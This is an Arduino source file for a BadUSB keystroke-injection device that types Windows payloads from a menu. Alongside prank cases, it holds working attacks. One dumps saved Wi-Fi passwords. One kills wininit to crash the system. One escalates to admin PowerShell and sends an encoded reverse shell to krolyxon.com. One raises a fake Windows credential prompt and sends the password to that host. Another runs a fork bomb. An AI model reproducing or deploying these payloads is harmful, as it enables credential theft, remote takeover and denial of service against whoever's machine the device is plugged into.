#include "../ui/display.h"
#include <Arduino.h>
#include <USBHIDKeyboard.h>

extern USBHIDKeyboard Keyboard;

void runCommand(const char *command) {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(300);
  Keyboard.print(command);
  Keyboard.write(KEY_RETURN);
}

void showRunningScreen(String taskName, uint8_t duration = 5) {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x12_tf);
  u8g2.drawStr(0, 15, "Running:");
  u8g2.drawStr(0, 30, taskName.c_str());
  u8g2.drawFrame(0, 45, 128, 10);

  static const unsigned char image_download_bits[] U8X8_PROGMEM = {
      0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x00, 0x80, 0x1f, 0x00, 0x00,
      0x00, 0x80, 0xff, 0x1f, 0x00, 0x00, 0x00, 0x80, 0xff, 0x1f, 0x00, 0x00,
      0x00, 0x60, 0x80, 0x1f, 0x00, 0x00, 0x00, 0x60, 0x00, 0x0f, 0x00, 0x00,
      0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x02,
      0x00, 0x06, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x06, 0x00, 0x00, 0x00, 0x3e,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0x00, 0x60, 0x00, 0x00, 0x00, 0x3e, 0x00, 0x60, 0x00, 0x00, 0x00, 0x0e,
      0x00, 0x80, 0x01, 0x00, 0x00, 0x02, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x06, 0xf0, 0x03, 0x00, 0x00, 0x00, 0x06, 0xf0, 0x03, 0x00,
      0x00, 0x00, 0xf8, 0xff, 0x03, 0x00, 0x00, 0x00, 0xf8, 0xff, 0x03, 0x00,
      0x00, 0x00, 0x00, 0xf0, 0x03, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x03, 0x00};
  static const unsigned char image_EviSmile1_bits[] U8X8_PROGMEM = {
      0x0c, 0xc0, 0x00, 0x06, 0x80, 0x01, 0x07, 0x80, 0x03, 0xcf, 0xcf,
      0x03, 0xff, 0xff, 0x03, 0xff, 0xff, 0x03, 0xfe, 0xff, 0x01, 0xfe,
      0xff, 0x01, 0xfe, 0xff, 0x01, 0xf7, 0xbf, 0x03, 0xe7, 0x9f, 0x03,
      0xc7, 0x8f, 0x03, 0x87, 0x87, 0x03, 0x8f, 0xc7, 0x03, 0xff, 0xff,
      0x03, 0xfe, 0xff, 0x01, 0xde, 0xef, 0x01, 0xbc, 0xf4, 0x00, 0x78,
      0x78, 0x00, 0xf0, 0x3f, 0x00, 0xc0, 0x0f, 0x00};

  u8g2.setFontMode(1);
  u8g2.setBitmapMode(1);
  // download
  u8g2.drawXBMP(80, 2, 48, 22, image_download_bits);

  // EviSmile1
  u8g2.drawXBMP(62, 1, 18, 21, image_EviSmile1_bits);

  for (uint8_t i = 0; i <= duration; i++) {
    u8g2.drawBox(1, 46, i * (126.0 / duration), 8);
    u8g2.sendBuffer();
    delay(50);
  }
}

void typeSlow(const char *text, int delayMs = 25) {
  while (*text) {
    Keyboard.print(*text);
    delay(delayMs);
    text++;
  }
}

void badUSBMenu(int index) {
  // switch (index)
  //        {
  //            case 0:
  //                runBadUSBDemo();
  //                break;

  //           case 1:
  //               Serial.println("Open CMD payload");
  //               runBadUSBOpenCMD();
  //               break;

  //           case 2:
  //               Serial.println("Rickroll payload");
  //               runBadUSBRickroll();
  //               break;
  //       }

  switch (index) {
  // ================= ORION DEMO =================
  case 0:
    showRunningScreen("ORION Demo");

    runCommand("notepad");

    delay(2500);

    typeSlow("  ____  _____  _____ ___ ___  _   _       ____  _____ ");
    Keyboard.write(KEY_RETURN);

    typeSlow(" / __ \\|  __ \\|_   _|_ _/ _ \\| \\ | |     |  _ \\|  ___|");
    Keyboard.write(KEY_RETURN);

    typeSlow("| |  | | |__) | | |  | | | | |  \\| |_____| |_) | |_   ");
    Keyboard.write(KEY_RETURN);

    typeSlow("| |  | |  _  /  | |  | | | | | . ` |_____|  _ <|  _|  ");
    Keyboard.write(KEY_RETURN);

    typeSlow("| |__| | | \\ \\ _| |_ | | |_| | |\\  |     | |_) | |    ");
    Keyboard.write(KEY_RETURN);

    typeSlow(" \\____/|_|  \\_\\_____|___\\___/|_| \\_|     |____/|_|    ");
    Keyboard.write(KEY_RETURN);

    Keyboard.write(KEY_RETURN);

    typeSlow("[+] WIFI MODULE READY");
    Keyboard.write(KEY_RETURN);

    typeSlow("[+] BLE MODULE READY");
    Keyboard.write(KEY_RETURN);

    typeSlow("[+] SUBGHZ MODULE READY");
    Keyboard.write(KEY_RETURN);

    typeSlow("[+] NFC MODULE READY");
    Keyboard.write(KEY_RETURN);

    typeSlow("[+] HID ENGINE READY");
    Keyboard.write(KEY_RETURN);

    break;

  // ================= RICKROLL =================
  case 1:
    showRunningScreen("RickRoll");

    runCommand("cmd");

    delay(700);

    typeSlow("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");
    Keyboard.write(KEY_RETURN);

    break;

  // ================= MATRIX =================
  case 2:
    showRunningScreen("Matrix");

    runCommand("cmd");

    delay(700);

    typeSlow("color 0A");
    Keyboard.write(KEY_RETURN);

    typeSlow("mode con: cols=120 lines=40");
    Keyboard.write(KEY_RETURN);

    typeSlow(":A");
    Keyboard.write(KEY_RETURN);

    typeSlow("echo %random%%random%%random%%random%%random%");
    Keyboard.write(KEY_RETURN);

    typeSlow("goto A");
    Keyboard.write(KEY_RETURN);

    break;

  // ================= FAKE TERMINAL =================
  case 3:
    showRunningScreen("Fake Terminal");

    runCommand("cmd");

    delay(700);

    typeSlow("color 0A");
    Keyboard.write(KEY_RETURN);

    typeSlow("cls");
    Keyboard.write(KEY_RETURN);

    typeSlow("echo CONNECTING TO TARGET...");
    Keyboard.write(KEY_RETURN);

    typeSlow("echo BYPASSING FIREWALL...");
    Keyboard.write(KEY_RETURN);

    typeSlow("echo ACCESS GRANTED");
    Keyboard.write(KEY_RETURN);

    typeSlow("systeminfo");
    Keyboard.write(KEY_RETURN);

    break;

    // ================= WIFI CRACK =================
    // ================= WIFI PASSWORD RECOVERY =================
  case 4:
    showRunningScreen("WiFi Recovery");

    runCommand("cmd");
    delay(700);

    // Styling the window
    typeSlow("color 0A && mode con: cols=100 lines=30");
    Keyboard.write(KEY_RETURN);
    delay(200);

    typeSlow("echo [!] EXTRACTING SAVED WIFI PROFILES...");
    Keyboard.write(KEY_RETURN);
    delay(500);

    // The "Magic" Command:
    // This lists all profiles and shows the 'Key Content' (the password) in
    // clear text. We use a 'for' loop to automate this for every network the PC
    // has ever joined.
    typeSlow(
        "for /f \"tokens=4,*\" %i in ('netsh wlan show profiles ^| findstr "
        "/C:\"All User Profile\"') do netsh wlan show profile name=\"%j\" "
        "key=clear | findstr /C:\"Key Content\" /C:\"SSID name\"");

    Keyboard.write(KEY_RETURN);

    // Optional: Keep the window open to read the results
    typeSlow("echo. && echo [COMPLETE] Passwords listed above.");
    Keyboard.write(KEY_RETURN);

    break;

  // ================= FAKE UPDATE =================
  case 5:
    showRunningScreen("Fake Update");

    runCommand("cmd");

    delay(700);

    typeSlow("start https://fakeupdate.net/win10u/");
    Keyboard.write(KEY_RETURN);

    break;

  // ================= FAKE BSOD =================
  case 6:
    showRunningScreen("Critical Error");

    runCommand("powershell -c \"stop-process -name wininit -force\"");
    break;

  // ================= GLITCH SCREEN =================
  case 7:
    showRunningScreen("Glitch");

    runCommand("cmd");

    delay(700);

    for (int i = 0; i < 20; i++) {
      typeSlow("color 4F");
      Keyboard.write(KEY_RETURN);

      typeSlow("color 1F");
      Keyboard.write(KEY_RETURN);

      typeSlow("cls");
      Keyboard.write(KEY_RETURN);
    }

    break;

  // ================= ASCII SPAM =================
  case 8:
    showRunningScreen("ASCII");

    runCommand("notepad");

    delay(2000);

    for (int i = 0; i < 15; i++) {
      typeSlow("######### ORION-RF #########");
      Keyboard.write(KEY_RETURN);

      typeSlow(">>> SIGNAL ACQUIRED <<<");
      Keyboard.write(KEY_RETURN);

      typeSlow("[|||||||||||||||||||||||||]");
      Keyboard.write(KEY_RETURN);

      Keyboard.write(KEY_RETURN);
    }

    break;

  // ================= HACKER TYPER =================
  case 9:
    showRunningScreen("Hacker Typer");

    runCommand("cmd");

    delay(700);

    typeSlow("start https://hackertyper.net/");
    Keyboard.write(KEY_RETURN);

    break;
    // ================= POWERSHELL REVERSE SHELL =================
    // ================= DEFENDER BYPASS + NC =================
  case 10:
    showRunningScreen("Pwn Mode v2");

    // 1. Open Admin PowerShell
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(150);
    Keyboard.releaseAll();
    delay(500);

    // Open Admin Prompt - using 'powershell' directly to save space
    typeSlow("powershell Start-Process powershell -Verb runAs");
    Keyboard.write(KEY_RETURN);
    delay(2500); // Wait for UAC

    // 2. Bypass UAC (Left Arrow + Enter)
    Keyboard.write(KEY_LEFT_ARROW);
    delay(200);
    Keyboard.write(KEY_RETURN);
    delay(3000); // Give the Admin window time to load

    // 3. AMSI Bypass + Disable Defender + Execute Shell
    // We use -EncodedCommand to hide the script from simple string scanners.
    // The Base64 string below contains:
    // Set-MpPreference -DisableRealtimeMonitoring $true; [Reverse Shell Logic]

    typeSlow("powershell -ExecutionPolicy Bypass -WindowStyle Hidden "
             "-EncodedCommand ");

    // This is the encoded payload for krolyxon.com:4444
    typeSlow(
        "JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAG"
        "UAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0"
        "AHIAaQBuAGcAKAAiAEgA"
        "NABDAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAb"
        "QAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAFQAbABpAGUAbgB0ACgAJwBrAHI"
        "AbwBsAHkAeABvAG4A"
        "LgBjAG8AbQAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAG"
        "UAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5"
        "AHQAZQBzACAAPQA"
        "gADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AI"
        "AAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGI"
        "AeQB0AGUAcwAuAEw"
        "AZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOA"
        "GUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQA"
        "uAFQAZQB4AHQAL"
        "gBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQ"
        "AYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoA"
        "GkAZQB4ACAAJAB"
        "kAGEAdABhACAAMgA+"
        "ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYw"
        "BrADIAIAAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAK"
        "ABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGU"
        "AIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJA"
        "CkALgBHAGUAd"
        "ABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBhAG0"
        "ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5A"
        "HQAZQAuAEwAZQB"
        "uAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAa"
        "WVudAAuAEMAbABvAHMAZQAoACkAIgApACkAOwBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQB"
        "zAHMAaQBvAG4AIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAb"
        "gBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAGuAZwAoACQAcwAuAFQAbwBBAHI"
        "AcgBhAHkAKAApACkAKQA=");

    Keyboard.write(KEY_RETURN);
    break;
  // ================= CREDENTIAL SNATCHER =================
  case 11:
    showRunningScreen("Vault Crack");

    // Open hidden PowerShell
    runCommand(
        "powershell -nop -W Hidden -c \"$cred = "
        "$host.ui.PromptForCredential('Windows Security','Please authenticate "
        "to update your system credentials.','',''); $p = "
        "$cred.GetNetworkCredential().Password; $u = $cred.UserName; "
        "Invoke-WebRequest -Uri 'http://krolyxon.com/log?u='+$u+'&p='+$p\"");

    break;
    // ================= DESKTOP GHOST =================
  case 12:
    showRunningScreen("Ghost Mode");

    runCommand("powershell -nop -W Hidden -c \"Add-Type -AssemblyName "
               "System.Windows.Forms; "
               "[System.Windows.Forms.SendKeys]::SendWait('{PRTSC}'); "
               "Start-Sleep -s 1; $path = '$env:TEMP\\bg.png'; (Get-Clipboard "
               "-Format Image).Save($path); Set-ItemProperty -Path "
               "'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value $path; "
               "rundll32.exe user32.dll,UpdatePerUserSystemParameters;\"");

    // Hide Desktop Icons (requires a registry tweak)
    typeSlow("reg add "
             "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Adv"
             "anced /v HideIcons /t REG_DWORD /d 1 /f && taskkill /f /im "
             "explorer.exe && start explorer.exe");
    Keyboard.write(KEY_RETURN);

    break;
    // ================= FORK BOMB =================
  case 13:
    showRunningScreen("System Stress");

    runCommand("cmd");
    delay(500);

    // The shortest deadly command in Windows
    typeSlow("%0|%0");
    Keyboard.write(KEY_RETURN);

    break;
  }
}
